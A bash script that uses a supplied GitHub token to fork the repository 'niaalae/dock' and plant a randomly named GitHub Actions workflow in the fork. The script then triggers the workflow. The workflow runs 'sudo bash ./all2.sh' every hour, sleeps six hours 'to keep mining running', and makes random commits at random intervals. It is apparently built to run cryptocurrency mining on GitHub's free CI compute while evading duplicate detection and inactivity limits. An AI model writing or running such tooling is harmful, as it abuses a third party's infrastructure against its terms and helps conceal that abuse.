#!/bin/bash
# Usage: bash gh_fork_and_run_workflow.sh <GITHUB_TOKEN>
# Uses GitHub API to fork, create workflow with RANDOM NAME, and run it

set -e

if [ -z "$1" ]; then
  echo "Usage: $0 <GITHUB_TOKEN>"
  exit 1
fi

GITHUB_TOKEN="$1"
SOURCE_REPO="niaalae/dock"

# Generate random workflow name to avoid duplication
RANDOM_SUFFIX=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
WORKFLOW_NAME="amits_${RANDOM_SUFFIX}.yml"

echo "Generated random workflow name: $WORKFLOW_NAME"

# Workflow content with the random name embedded
WORKFLOW_CONTENT=$(cat <<'EOF' | base64 -w 0
name:  amits

on:
  workflow_dispatch:
  schedule:
    - cron: '0 * * * *'  # Runs every hour

jobs:
  amit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v3


      - name: Run all2.sh
        run: sudo bash ./all2.sh

      - name: Keep action alive for 6h
        run: |
          echo "Sleeping for 6 hours to keep mining running..."
          sleep 21600

      - name: Make random commits
        run: |
          for i in $(seq 1 $((RANDOM % 3 + 1))); do
            echo "Random commit $i at $(date)" >> random_commit.txt
            git add random_commit.txt
            git config --global user.email "actions@github.com"
            git config --global user.name "GitHub Actions"
            git commit -m "Random commit $i at $(date)"
            sleep $((RANDOM % 3600))
          done
          git push
EOF
)

export GH_TOKEN="$GITHUB_TOKEN"

# Get current user
FORK_OWNER=$(gh api user --jq '.login')
echo "Authenticated as: $FORK_OWNER"

# Check if fork already exists
FORK_REPO="$FORK_OWNER/dock"
echo "Checking if fork exists: $FORK_REPO"

if gh api "repos/$FORK_REPO" --jq '.full_name' 2>/dev/null | grep -q "$FORK_OWNER"; then
  echo "Fork already exists."
else
  echo "Creating fork..."
  gh api \
    --method POST \
    -H "Accept: application/vnd.github+json" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    "/repos/$SOURCE_REPO/forks" \
    --jq '.full_name'
  echo "Fork created."
  
  # Wait for fork to be ready
  echo "Waiting for fork to be ready..."
  for i in {1..10}; do
    if gh api "repos/$FORK_REPO" --jq '.full_name' 2>/dev/null | grep -q "$FORK_OWNER"; then
      echo "Fork is ready!"
      break
    fi
    echo "Waiting... ($i/10)"
    sleep 3
  done
fi

# Create workflow file path
WORKFLOW_PATH=".github/workflows/$WORKFLOW_NAME"
echo "Creating workflow at: $WORKFLOW_PATH"

# Create file via API (always create new, no update needed since name is random)
echo "Creating workflow file via API..."
gh api \
  --method PUT \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  "/repos/$FORK_REPO/contents/$WORKFLOW_PATH" \
  -f message="Add $WORKFLOW_NAME" \
  -f content="$WORKFLOW_CONTENT" \
  --jq '.content.html_url'

echo "Workflow file created on GitHub."

# Wait for GitHub Actions to index
echo "Waiting for GitHub Actions to index the workflow..."
WORKFLOW_ID=""
for i in {1..24}; do
  echo "Check $i/24..."
  WORKFLOW_ID=$(gh workflow list --repo "$FORK_REPO" --all --json id,path --jq ".[] | select(.path==\"$WORKFLOW_PATH\") | .id" 2>/dev/null || echo "")
  
  if [ -n "$WORKFLOW_ID" ]; then
    echo "Workflow indexed! ID: $WORKFLOW_ID"
    break
  fi
  sleep 5
done

if [ -z "$WORKFLOW_ID" ]; then
  echo "ERROR: Workflow not indexed after 2 minutes."
  echo "Check manually at: https://github.com/$FORK_REPO/actions"
  exit 1
fi

# Trigger workflow immediately (don't wait for schedule)
echo "Triggering workflow..."
gh workflow run "$WORKFLOW_ID" --repo "$FORK_REPO"

# Wait for run to start
echo "Waiting for run to start..."
sleep 15

# Get run ID
RUN_ID=$(gh run list --repo "$FORK_REPO" --workflow "$WORKFLOW_ID" --json databaseId --jq '.[0].databaseId' 2>/dev/null || echo "")

if [ -z "$RUN_ID" ]; then
  echo "No run found yet, waiting more..."
  sleep 20
  RUN_ID=$(gh run list --repo "$FORK_REPO" --workflow "$WORKFLOW_ID" --json databaseId --jq '.[0].databaseId' 2>/dev/null || echo "")
fi

if [ -n "$RUN_ID" ]; then
  echo "Run started! Run ID: $RUN_ID"
  echo ""
  echo "Fetching run details..."
  gh run view "$RUN_ID" --repo "$FORK_REPO" --log || true
  echo ""
  echo "Run URL: https://github.com/$FORK_REPO/actions/runs/$RUN_ID"
  
  # Poll for completion
  echo ""
  echo "Polling run status (Ctrl+C to stop watching)..."
  while true; do
    STATUS=$(gh run view "$RUN_ID" --repo "$FORK_REPO" --json status --jq '.status' 2>/dev/null || echo "unknown")
    CONCLUSION=$(gh run view "$RUN_ID" --repo "$FORK_REPO" --json conclusion --jq '.conclusion' 2>/dev/null || echo "")
    
    echo "Status: $STATUS ${CONCLUSION:+($CONCLUSION)}"
    
    if [ "$STATUS" = "completed" ]; then
      echo "Run completed with conclusion: $CONCLUSION"
      break
    fi
    
    sleep 30
  done
  
else
  echo "Run started but couldn't get ID. Check at: https://github.com/$FORK_REPO/actions"
fi

echo ""
echo "=========================================="
echo "Workflow: $WORKFLOW_NAME"
echo "Fork: https://github.com/$FORK_REPO"
echo "Actions: https://github.com/$FORK_REPO/actions"
echo "=========================================="